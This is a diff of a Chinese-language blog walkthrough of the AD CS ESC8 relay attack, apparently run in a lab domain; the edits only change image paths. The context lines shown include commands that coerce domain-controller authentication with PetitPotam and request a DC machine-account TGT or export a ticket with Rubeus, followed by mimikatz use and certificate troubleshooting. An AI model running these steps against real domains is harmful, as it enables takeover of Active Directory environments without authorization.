@@ -30,7 +30,7 @@ certutil  -ca
 ```shell
 curl http://ca2016.shi.com/certsrv/ -I
 ```
-![图片](imgs/AD CS relay attack-ESC8/640.jpeg)
+![图片](/assets/posts/AD CS relay attack-ESC8/640.jpeg)
 ### 开启中继(kali)
 > 配置hosts或者指定IP
 ```
@@ -57,7 +57,7 @@ Invoke-Petitpotam -Target 域控IP -CaptureHost kali
 
 ```
 ### 获得证书(kali),请求TGT(域内攻击机)
-![image-20220930133025850](imgs/AD CS relay attack-ESC8/image-20220930133025850.png)
+![image-20220930133025850](/assets/posts/AD CS relay attack-ESC8/image-20220930133025850.png)
 + kekeo
 ```
 base64 /input:on
@@ -70,10 +70,10 @@ Rubeus.exe asktgt /user:DC$ /certificate:获得的base64证书 /domain:shi.com /
 //或者导出票据(票据可以在非域内机器上使用)
 Rubeus.exe asktgt /user:DC$ /certificate:获得的base64证书 /outfile:ticket.kirbi
 ```
-![image-20220930133203564](imgs/AD CS relay attack-ESC8/image-20220930133203564.png)
+![image-20220930133203564](/assets/posts/AD CS relay attack-ESC8/image-20220930133203564.png)
 ### 查看票据
 `klist`
-![image-20220930134048530](imgs/AD CS relay attack-ESC8/image-20220930134048530.png)
+![image-20220930134048530](/assets/posts/AD CS relay attack-ESC8/image-20220930134048530.png)
 ### 使用票据
 #### mimikatz.exe
 ```
@@ -106,7 +106,7 @@ https://twitter.com/gentilkiwi/status/1419772619004448770
 https://support.citrix.com/article/CTX218941
 当您尚未将域控制器身份验证证书导入域控制器时，通常会出现此错误。Citrix在此详细介绍了此过程。
 简而言之，进入您的DC并打开MMC。在MMC中，为计算机帐户添加证书加载项并请求域控制器身份验证证书。
-![img](imgs/AD CS relay attack-ESC8/image-22.png)
+![img](/assets/posts/AD CS relay attack-ESC8/image-22.png)
 解决方案
 您需要在所有域控制器上拥有域控制器身份验证证书。要注册新证书，请按照以下步骤操作。
 在域控制器上，打开 mmc。
